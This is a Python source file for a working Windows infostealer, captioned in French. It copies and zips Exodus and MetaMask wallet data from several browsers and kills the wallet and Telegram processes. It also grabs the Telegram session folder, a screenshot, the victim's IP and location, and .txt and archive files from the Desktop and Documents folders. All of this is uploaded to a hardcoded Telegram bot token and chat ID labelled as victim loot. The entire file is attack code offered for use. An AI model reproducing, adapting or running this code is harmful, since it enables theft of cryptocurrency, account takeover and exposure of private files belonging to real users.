import httpx
import shutil
import psutil
import os.path
import getpass
import zipfile
import asyncio
import tempfile
import requests
import telegram
import pycountry
import multiprocessing
from PIL import ImageGrab
from typing import List, Tuple, Dict

client: str = os.path.expanduser("~")
source_dir = client + "\\AppData\\Roaming\\Exodus"
dest_dir = client + "\\AppData\\Local\\Temp\\Exodus"
telegram_dir = client + "\\AppData\\Roaming\\Telegram Desktop\\tdata"

TELEGRAM_TOKEN = '5801823581:AAG2e6Xf4JFhxfSRJgVNN2YvrRvrczySkgw'
TELEGRAM_CHAT_ID = '-923237730'

username = getpass.getuser()
ip_address = requests.get('https://api.ipify.org').text

response = requests.get(f'http://ip-api.com/json/{ip_address}')
country_code = response.json().get('countryCode', '')
country = pycountry.countries.get(alpha_2=country_code)
isp = response.json().get('isp', '')

has_exodus = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Exodus'))
has_ledger = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Ledger Live'))
has_telegram = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'))

def has_metamask() -> bool:
    metamask_path = os.path.join(client, "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn")
    return os.path.exists(metamask_path)

def kill_metamask_processes():
    for process in psutil.process_iter():
        try:
            process_info = process.as_dict(attrs=['pid', 'name', 'exe', 'cmdline'])
            process_name = process_info['name'].lower()
            process_exe = process_info['exe']
            process_cmdline = process_info['cmdline']

            if 'metamask' in process_name or (process_exe and 'metamask' in process_exe) or (process_cmdline and 'metamask' in ' '.join(process_cmdline)):
                process.terminate()
                process.wait()
                print(f"Terminated Metamask process with pid {process_info['pid']}")

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

def zip_metamask_files() -> List[str]:
    meta_paths = [
        [f"{client}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Edge"],
        [f"{client}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Brave"],
        [f"{client}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Google"],
        [f"{client}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "OperaGX"]
    ]

    zipped_files = []
    for meta_path, browser in meta_paths:
        if os.path.exists(meta_path):
            dest_metamask = os.path.join(client, f"\\AppData\\Local\\Temp\\Metamask_{browser}")
            dest_metamask_zip = os.path.join(client, f"\\AppData\\Local\\Temp\\Metamask_{browser}.zip")

            if os.path.exists(dest_metamask):
                shutil.rmtree(dest_metamask)

            kill_metamask_processes()

            try:
                shutil.copytree(meta_path, dest_metamask)
            except shutil.Error as e:
                for src, dest, error in e.args[0]:
                    if '[Errno 13] Permission denied' in str(error):
                        #print(f"Permission denied for {src}. Skipping.")
                        pass
                    else:
                        raise

            shutil.make_archive(dest_metamask, "zip", dest_metamask)

            shutil.rmtree(dest_metamask)

            zipped_files.append(dest_metamask_zip)

    return zipped_files

def path_exists() -> bool:
    if os.path.exists(client + "\\AppData\\Roaming\\Exodus"):

        return True
    else:
        return False

def zip_files() -> bool:
    try:
        if os.path.exists(dest_dir):
            shutil.rmtree(dest_dir)

        shutil.copytree(source_dir, dest_dir)
        shutil.make_archive(dest_dir, "zip", dest_dir)
        return True
    except:
        return False

def remove_files() -> bool:
    try:
        os.remove(client + "\\AppData\\Local\\Temp\\Exodus.zip")
        os.remove(client + "\\AppData\\Local\\Temp\\Exodus")
        return True
    except:
        return False

def send_file_telegram(file_path: str) -> bool:
    try:
        with open(file_path, "rb") as exodus_zip:
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': "𝗘𝗫𝗢𝗗𝗨𝗦"
            }
            files = {
                'document': ('Exodus.zip', exodus_zip)
            }
            response = httpx.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files)
        
        if response.status_code == 200:
            return True
        else:
            return False
    except:
        return False

def send_screenshot_telegram() -> bool:
    try:

        screenshot = ImageGrab.grab()

        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as f:
            screenshot.save(f.name)
            file_name = f.name

        with open(file_name, 'rb') as photo:
            files = {'photo': photo}
            url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto'
            params = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f'🅥🅘🅒🅣🅘🅜🅔   🅢🅣🅔🅐🅛🅔🅓 \n\n► 𝗨𝗧𝗜𝗟𝗜𝗦𝗔𝗧𝗘𝗨𝗥 : {username}\n► 𝗣𝗔𝗬𝗦 : {country.name if country else ""}\n► 𝗜𝗣 𝗔𝗗𝗥𝗘𝗦𝗦𝗘 : {ip_address}\n► 𝗜𝗦𝗣 : {isp} \n\n► 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 {"✅" if has_telegram else "❌"}\n► 𝗟𝗘𝗗𝗚𝗘𝗥 : {"✅" if has_ledger else "❌"}\n► 𝗠𝗘𝗧𝗔𝗠𝗔𝗦𝗞 : {"✅" if has_metamask else "❌"}\n► 𝗘𝗫𝗢𝗗𝗨𝗦 : {"✅" if has_exodus else "❌"}'}
            response = httpx.post(url, files=files, data=params)
            if response.status_code != 200:
                return False
            else:
                return True
    except:
        return False

def send_metamask_file_telegram(file_paths: List[str]) -> bool:
    try:
        sent_successfully = True
        for file_path in file_paths:
            with open(file_path, "rb") as metamask_zip:
                data = {
                    'chat_id': TELEGRAM_CHAT_ID,
                    'caption': "𝗠𝗘𝗧𝗔𝗠𝗔𝗦𝗞"
                }
                files = {
                    'document': ('Metamask.zip', metamask_zip)
                }
                response = httpx.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files)

            if response.status_code != 200:
                sent_successfully = False

            os.remove(file_path)

        return sent_successfully
    except:
        return False

def send_telegram_session():
    session_folder_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
    script_parent_folder = os.path.dirname(os.path.abspath(__file__))

    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == 'Telegram.exe':
            pid = proc.pid

            os.kill(pid, 9)

    with tempfile.NamedTemporaryFile(suffix='.zip', delete=False, dir=script_parent_folder) as f:
        zip_filename = f.name

    if not os.path.exists(session_folder_path):
        return False

    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for root, dirs, files in os.walk(session_folder_path):
            for file in files:
                zip_file.write(os.path.join(root, file))

    if not os.path.exists(zip_filename):
        return False

    try:
        with open(zip_filename, "rb") as session_zip:
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': "𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗦𝗘𝗦𝗦𝗜𝗢𝗡"
            }
            files = {
                'document': ('session.zip', session_zip)
            }
            response = httpx.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files)

        if response.status_code == 200:
            os.remove(zip_filename)
            return True
        else:
            os.remove(zip_filename)
            return False
    except Exception as e:
        os.remove(zip_filename)
        return False

def send_txtfiles_telegram() -> bool:
    try:
        txt_file_count = 0
        temp_txt_zip = os.path.join(tempfile.gettempdir(), "Fichiers_TXT.zip")

        # Créez d'abord un objet ZipFile temporaire et stockez les fichiers TXT dedans
        with zipfile.ZipFile(temp_txt_zip, "w", zipfile.ZIP_DEFLATED) as zip_file:
            for folder in ['Desktop', 'Documents']:
                for root, dirs, files in os.walk(os.path.join(os.path.expanduser("~"), folder)):
                    for file in files:
                        if file.endswith(".txt"):
                            txt_file_count += 1  # Incrémenter le compteur de fichiers
                            zip_file.write(os.path.join(root, file))

        # Vérifiez s'il y a des fichiers TXT
        if txt_file_count == 0:
            return False

        with open(temp_txt_zip, "rb") as txt_zip:
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': f"𝗙𝗜𝗖𝗛𝗜𝗘𝗥𝗦 : {txt_file_count} "
            }
            files = {
                'document': ('Fichiers_TXT.zip', txt_zip)
            }
            response = httpx.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files)

        if response.status_code == 200:
            return True
        else:
            return False
    except:
        return False


def send_compressed_files_telegram() -> bool:
    try:
        compressed_file_count = 0
        temp_compressed_zip = os.path.join(tempfile.gettempdir(), "Fichiers_Comprimes.zip")
        with zipfile.ZipFile(temp_compressed_zip, "w", zipfile.ZIP_DEFLATED) as zip_file:
            for folder in ['Desktop', 'Documents']:
                for root, dirs, files in os.walk(os.path.join(os.path.expanduser("~"), folder)):
                    for file in files:
                        if file.endswith(".zip") or file.endswith(".rar"):
                            compressed_file_count += 1
                            zip_file.write(os.path.join(root, file))
                            
        with open(temp_compressed_zip, "rb") as compressed_zip:
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': f"𝗗𝗢𝗦𝗦𝗜𝗘𝗥𝗦 :  : {compressed_file_count}"
            }
            files = {
                'document': ('Fichiers_Comprimes.zip', compressed_zip)
            }
            response = httpx.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files)

        if response.status_code == 200:
            return True
        else:
            return False
    except:
        return False

def packagemernoda():
    if path_exists() == True:
        if zip_files() == True:
            screenshot_sent = send_screenshot_telegram()
            exodus_sent = send_file_telegram(client + "\\AppData\\Local\\Temp\\Exodus.zip")
            metamask_zips = zip_metamask_files()
            metamask_sent = send_metamask_file_telegram(metamask_zips)
            if has_telegram:
                telegram_session_sent = send_telegram_session()
            else:
                telegram_session_sent = True

            txt_files_sent = send_txtfiles_telegram()
            compressed_files_sent = send_compressed_files_telegram()

            if screenshot_sent and exodus_sent and (not has_telegram or telegram_session_sent) and metamask_sent and txt_files_sent and compressed_files_sent:
                exit(code=None)
            else:
                exit(code=None)
        else:
            exit(code=None)
    else:
        exit(code=None)

if __name__ == "__main__":
    packagemernoda()



